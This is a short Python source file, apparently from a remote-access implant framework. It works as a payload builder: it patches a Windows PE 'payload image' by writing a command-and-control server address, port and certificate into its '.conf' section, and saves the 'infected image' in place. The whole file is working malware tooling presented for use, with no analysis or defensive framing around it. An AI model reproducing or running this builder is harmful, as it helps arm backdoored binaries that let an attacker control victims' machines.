#!/usr/bin/env python

import sys, os, socket
from struct import pack, unpack

from server.config import Conf
from server.server import KeysManager

inet_aton = lambda v: unpack('I', socket.inet_aton(v))[0]

CONFIG_SECTION = '.conf'
CONFIG_FMT = '=32sH'
CONFIG_LEN = 32 + 2

def _config_offset(pe):
        
    for section in pe.sections:

        # find .conf section of payload image
        if section.Name[: len(CONFIG_SECTION)] == CONFIG_SECTION:

            return section.PointerToRawData

    raise(Exception('Unable to find %s section' % CONFIG_SECTION))

def _config_get(pe, data):

    offs = _config_offset(pe)
    
    return unpack(CONFIG_FMT, data[offs : offs + CONFIG_LEN])        

def _config_set(pe, data, cert, *args):

    offs = _config_offset(pe)

    print('\"%s\" section at RVA 0x%x' % (CONFIG_SECTION, offs))

    return data[: offs] + pack(CONFIG_FMT, *args) + cert + \
           data[offs + CONFIG_LEN + len(cert) :]

def build(src, addr, cert, dst = None):

    import pefile

    # load PE image
    pe = pefile.PE(src)

    with open(src, 'rb') as fd:

        # read image data into the string
        data = fd.read()

    print('%d bytes readed from \"%s\"' % (len(data), src))
    
    # write configuration back to the image
    data = _config_set(pe, data, cert, *addr)

    if dst is not None:

        with open(dst, 'wb') as fd:

            # save infected image to the file
            fd.write(data)

        print('%d bytes written into the \"%s\"' % (len(data), dst))

    pe.close()

    return data

def main():

    if len(sys.argv) < 2:

        print('USAGE: payload_builder.py <binary_path> [<server_addr> [<server_port>]]')
        return -1

    path = sys.argv[1]

    if len(sys.argv) >= 3:

        addr = sys.argv[2]

    else:

        addr = Conf.SERVER_ADDR

    if len(sys.argv) >= 4:

        port = int(sys.argv[3])

    else:

        port = Conf.CLIENT_PORT

    manager = KeysManager(Conf.CERT_DIR_PATH)

    print('Using server address %s:%d' % (addr, port))
    print('Using server certificate \"%s\"' % manager.get_cert_path(Conf.CERT_NAME))

    cert = manager.get_cert_data(Conf.CERT_NAME)

    build(path, ( addr, port ), cert, dst = path)

    return 0

if __name__ == '__main__':

    exit(main())
